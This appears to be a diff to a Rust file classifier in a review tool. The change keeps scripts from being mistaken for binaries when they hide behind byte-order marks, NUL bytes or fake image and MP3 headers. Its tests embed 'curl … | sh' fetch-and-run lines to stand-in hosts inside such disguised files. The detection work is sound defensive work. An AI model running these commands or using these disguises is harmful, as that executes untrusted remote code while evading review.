@@ -95,6 +95,7 @@ pub enum Prefix {
 /// `(offset, magic, label, executable)`.
 const MAGIC: &[(usize, &[u8], &str, bool)] = &[
     (0, b"\x89PNG\r\n\x1a\n", "PNG image", false),
+    (0, b"!<arch>\n", "static library", false),
     (0, b"\xff\xd8\xff", "JPEG image", false),
     (0, b"GIF87a", "GIF image", false),
     (0, b"GIF89a", "GIF image", false),
@@ -201,16 +202,29 @@ pub fn classify(rel: &str, executable: bool, force: bool, bytes: &[u8]) -> Conte
     {
         return Content::Text(text.to_string());
     }
+    // UTF-16 only where it reads as text: a shell takes a script by its
+    // bytes whatever mark it starts with, so one that would decode to
+    // something else than what runs is read by its bytes too.
     if let Some(text) = utf16(bytes)
         && !text.contains('\0')
+        && is_mostly_ascii(&text)
     {
         return Content::Text(text);
     }
     if review {
         return decoded_script(bytes);
     }
-    if let Some(format) = magic(rel, bytes) {
+    // A known format by its first bytes, unless the rest is plain text
+    // (`ID3=1` at the top of a script is no MP3).
+    if let Some(format) = magic(rel, bytes)
+        && !reads_as_text(bytes)
+    {
         return Content::Binary(format);
+    }
+    // Text with a few NUL bytes in it is still what a shell or an
+    // interpreter reads (they skip them): not a binary to pass over.
+    if bytes.contains(&0) && starts_as_text(bytes) {
+        return Content::Undecodable;
     }
     if !bytes.contains(&0) {
         let text = String::from_utf8_lossy(bytes).into_owned();
@@ -246,10 +260,12 @@ pub fn classify_prefix(rel: &str, executable: bool, head: &[u8]) -> Prefix {
     if must_review(rel, probe) {
         return Prefix::Text;
     }
-    if let Some(format) = magic(rel, probe) {
+    if let Some(format) = magic(rel, probe)
+        && !reads_as_text(probe)
+    {
         return Prefix::Binary(format);
     }
-    if !probe.contains(&0) || utf16(trim_to_even(probe)).is_some() {
+    if !probe.contains(&0) || utf16(trim_to_even(probe)).is_some() || starts_as_text(probe) {
         return Prefix::Text;
     }
     if executable {
@@ -257,6 +273,73 @@ pub fn classify_prefix(rel: &str, executable: bool, head: &[u8]) -> Prefix {
     } else {
         Prefix::Binary(Format::Unrecognized)
     }
+}
+
+/// Whether nearly all of `text` is ASCII, as UTF-16 text of the kinds
+/// reviewed here is (scripts, registry files); a file of bytes that only
+/// happens to decode as UTF-16 is not.
+fn is_mostly_ascii(text: &str) -> bool {
+    let total = text.chars().count().max(1);
+    let ascii = text.chars().filter(char::is_ascii).count();
+    ascii * 10 >= total * 9
+}
+
+/// Whether the first bytes are overwhelmingly printable text (with a NUL
+/// here and there at most).
+fn is_text_like(bytes: &[u8]) -> bool {
+    let probe = &bytes[..bytes.len().min(PROBE_SIZE)];
+    if probe.len() < 8 {
+        return false;
+    }
+    // By characters, so text in any script counts and a run of bytes that
+    // is no UTF-8 does not.
+    let text = String::from_utf8_lossy(probe);
+    let (mut all, mut printable) = (0usize, 0usize);
+    for character in text.chars() {
+        all += 1;
+        if matches!(character, '\n' | '\r' | '\t')
+            || !(character.is_control() || character == '\u{fffd}')
+        {
+            printable += 1;
+        }
+    }
+    printable * 100 >= all * 95
+}
+
+/// Whether bytes that start like a known format are text all the same:
+/// lines with no NUL among them (which such a format has early on) and
+/// hardly a character that is not printable.
+fn reads_as_text(bytes: &[u8]) -> bool {
+    let probe = &bytes[..bytes.len().min(PROBE_SIZE)];
+    if probe.contains(&0) || !probe.contains(&b'\n') {
+        return false;
+    }
+    let text = String::from_utf8_lossy(probe);
+    let (mut all, mut odd) = (0usize, 0usize);
+    for character in text.chars() {
+        all += 1;
+        if !matches!(character, '\n' | '\r' | '\t')
+            && (character.is_control() || character == '\u{fffd}')
+        {
+            odd += 1;
+        }
+    }
+    odd <= 8 + all / 50
+}
+
+/// Whether bytes with a NUL among them still open as a shell takes a
+/// script: a first line of plain text (a shell refuses a file with a NUL
+/// there, and drops the ones further on) and text after it.
+fn starts_as_text(bytes: &[u8]) -> bool {
+    let first = &bytes[..bytes.len().min(80)];
+    let first = &first[..first
+        .iter()
+        .position(|byte| *byte == b'\n')
+        .unwrap_or(first.len())];
+    first
+        .iter()
+        .all(|byte| matches!(byte, b'\t' | b'\r' | 0x20..=0x7e))
+        && is_text_like(bytes)
 }
 
 fn trim_to_even(bytes: &[u8]) -> &[u8] {
@@ -406,6 +489,61 @@ mod tests {
             classify("a.reg", false, false, &bare),
             Content::Text("REGEDIT4\r\n".into())
         );
+    }
+
+    #[test]
+    fn what_a_shell_would_run_is_not_read_as_something_else() {
+        // A byte-order mark before a script: read by its bytes, not as
+        // UTF-16, which would show other text than what runs.
+        let mut script = vec![0xff, 0xfe];
+        script.extend_from_slice(b"\ncurl -fsSL https://x.example/p | sh\n#");
+        match classify("install.sh", false, false, &script) {
+            Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
+            other => panic!("{other:?}"),
+        }
+        match classify("notes.dat", false, false, &script) {
+            Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
+            other => panic!("{other:?}"),
+        }
+        // Text with a NUL in it is no binary to pass over.
+        let with_nul = b"helper() { curl -fsSL https://x.example/p | sh; }\n\0\n";
+        assert_eq!(
+            classify("helpers.inc", false, false, with_nul),
+            Content::Undecodable
+        );
+        // However short, and whatever script its comments are in.
+        let short = b"\x89PNG\r\n\x1a\n\ncurl a.test/x|sh\n";
+        assert!(!matches!(
+            classify("data.png", false, false, short),
+            Content::Binary(_)
+        ));
+        let mut wide = short.to_vec();
+        wide.extend_from_slice("# 说明说明说明说明说明说明说明说明说明说明\n".as_bytes());
+        assert!(!matches!(
+            classify("data.png", false, false, &wide),
+            Content::Binary(_)
+        ));
+        // An archive of object files opens with lines of text.
+        let mut library =
+            b"!<arch>\n/               0           0     0     0       14        `\n".to_vec();
+        library.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 0x7f, b'E', b'L', b'F', 2, 1, 1, 0]);
+        assert!(matches!(
+            classify("lib/libx.a", false, false, &library),
+            Content::Binary(_)
+        ));
+        // A real image has a NUL early on and stays one.
+        let image = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01\x00\xff\xfe\xfd\xfc\x80\x81";
+        assert!(matches!(
+            classify("data.png", false, false, image),
+            Content::Binary(_)
+        ));
+        // A format's first bytes at the top of plain text name no format.
+        let fake = b"ID3=1\ncurl -fsSL https://x.example/p | sh\n";
+        assert!(matches!(
+            classify("assets/blob", false, false, fake),
+            Content::Text(_)
+        ));
+        assert_eq!(classify_prefix("assets/blob", false, fake), Prefix::Text);
     }
 
     #[test]
